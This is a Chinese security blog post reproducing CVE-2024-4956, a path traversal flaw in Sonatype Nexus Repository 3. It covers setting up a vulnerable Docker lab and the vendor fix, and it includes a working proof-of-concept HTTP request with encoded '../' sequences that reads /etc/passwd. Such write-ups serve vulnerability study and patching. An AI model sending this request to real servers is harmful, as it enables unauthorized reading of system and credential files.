#  CVE-2024-4956：Nexus Repository 3目录穿越漏洞   
原创 Arvin  Timeline Sec   2024-11-12 18:58  
  
>   
> 关注我们❤️，添加星标🌟，一起学安全！作者：Arvin@TimeAxis Sec本文字数：1499阅读时长：2～3mins声明：仅供学习参考使用，请勿用作违法用途，否则后果自负  
  
## 0x01 简介  
  
Sonatype Nexus Repository 是美国Sonatype公司的一款存储库管理器，用于存储和分发软件组件、构建工件和 Docker 容器。它支持多种包格式，与 CI/CD 工具集成，并提供安全性和合规性功能。  
## 0x02 漏洞概述  
  
**漏洞编号：CVE-2024-4956**  
  
Nexus Repository仅依赖Jetty自带的方法进行请求路径的安全检查，而未进行深入的验证，导致攻击者可以利用路径穿越攻击访问文件系统上的任意位置。  
  
成功利用这一漏洞的攻击者可以读取Nexus Repository服务器上的任意文件，这可能包括配置文件、数据库备份以及其他敏感数据。此外，特定情况下如果攻击者能够进一步利用服务器上的其他配置或漏洞，可能会完全控制受影响的服务器。  
## 0x03 影响版本  
  
Sonatype Nexus Repository 3 < 3.68.1  
## 0x04 环境搭建  
  
任务调度中心【Docker方式构建】  
  
**1.拉取镜像**docker pull sonatype/nexus3:3.68.0  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiaAian6aEN2gCOAwWSCriaLAnib8aczoCaswHW7aiaXFEdiagjBRjibG5G0r27INxgucOYAuIF6RNT7cQ3Q/640?wx_fmt=png&from=appmsg "")  
  
**2.持久化目录**mkdir -p /home/nexus/datachmod 777 -R /home/nexus/data  
  
**3.查看镜像**IDdocker images  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiaAian6aEN2gCOAwWSCriaLAnz1yxkicDHrOZIQcnM9AibMXX2TlermzfRubGS3XAHc7u0LfDic0YicrDdA/640?wx_fmt=png&from=appmsg "")  
**4.创建nexus容器并启动**  
```
docker run -d --name nexus3 -p 8081:8081 --restart always -v /home/nexus/data:/nexus-data 镜像ID

```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiaAian6aEN2gCOAwWSCriaLAnB29bWuzj3Zalr2mt1LfXSdIw7tZPPEyag9L1h5UNn2A8MC6F1sicMbA/640?wx_fmt=png&from=appmsg "")  
  
访问http://yourip:8081/  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiaAian6aEN2gCOAwWSCriaLAnK6T7AChhfXWUy8pANX21B2DufRS4ktShrFcichOlkZ09305oicz2DzAA/640?wx_fmt=png&from=appmsg "")  
## 0x05 漏洞复现  
  
**直接使用poc可读取到/etc/passwd：**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/VfLUYJEMVsiaAian6aEN2gCOAwWSCriaLAnicYOgL4Da1ujFa0ezqULa14X5HGZRlhYxJwpfkMeFv9DMQpcHNepG3A/640?wx_fmt=png&from=appmsg "")  
## POC：GET /%2F%2F%2F%2F%2F%2F%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1Host: your-ipAccept-Encoding: gzip, deflate, brAccept: */*Accept-Language: en-US;q=0.9,en;q=0.8User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.159 Safari/537.36Connection: close0x06 修复方式  
  
目前官方已有可更新版本，建议受影响用户升级至最新版本。  
  
官方文档：https://help.sonatype.com/repomanager3/download  
## 历史漏洞  
  
CVE-2024-5764   
  
CVE-2024-4956  
  
[CVE-2020-29436](http://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247487093&idx=1&sn=2020381c1e245bf0c97bc7bf0afaf529&chksm=90392885a74ea193cf26cfd880aa7d65e67e5b9f0f3942a435ac983df1c91472a97e1af9aad9&scene=21#wechat_redirect)  
  
  
CVE-2020-24622  
  
CVE-2020-11444  
  
[CVE-2020-10204](http://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247484601&idx=1&sn=8cc85b1f8313b2a72e8d7426b9407b9d&chksm=90392249a74eab5fe9d8edde2e642ec4de25ddcbf956683f2413415b3430784a12fa64bcd4bc&scene=21#wechat_redirect)  
  
  
CVE-2020-10203  
  
[CVE-2020-10199](http://mp.weixin.qq.com/s?__biz=MzA4NzUwMzc3NQ==&mid=2247484601&idx=1&sn=8cc85b1f8313b2a72e8d7426b9407b9d&chksm=90392249a74eab5fe9d8edde2e642ec4de25ddcbf956683f2413415b3430784a12fa64bcd4bc&scene=21#wechat_redirect)  
  
  
CVE-2019-7238  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/VfLUYJEMVshRXmfDUFNGlTrAVB52XIXB6ibko0TibK4p8OGzoAXSoHSXvUwQk6FKTkNIslDL675W0QBOPfWmO6IA/640?wx_fmt=jpeg&from=appmsg "")  
  
  
回复  
【加群】  
进入微信交流群回复  
【SRC群】进入SRC-QQ交流群回复  
【新人】领取新人学习指南资料回复  
【面试】获取渗透测试常见面试题回复  
【合作】获取各类安全项目合作方式回复  
【帮会】付费加入SRC知识库学习回复  
【  
培训】  
获取TimelineSec官方培训课程详情  
  
  
视频号：搜索  
TimelineSec  
  
官方微博：[#小程序://微博/tPbUYdN9EucSD4C]()  
  
  
哔哩哔哩：  
https://space.bilibili.com/52459  
‍1903  
  
  
  
❤  
  
觉得有用就点个赞吧！  
  
欢迎评论区留言讨论～  
  
![](https://mmbiz.qpic.cn/mmbiz_png/OkhKF2m1syrmlAus2fxnsxZBk4oIuTvAVIaL6pKgic5DEa8ynqo44GUwNML3ggkqMpbE1fiaLYvpPzeBrQJCS5bA/640?wx_fmt=png&from=appmsg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
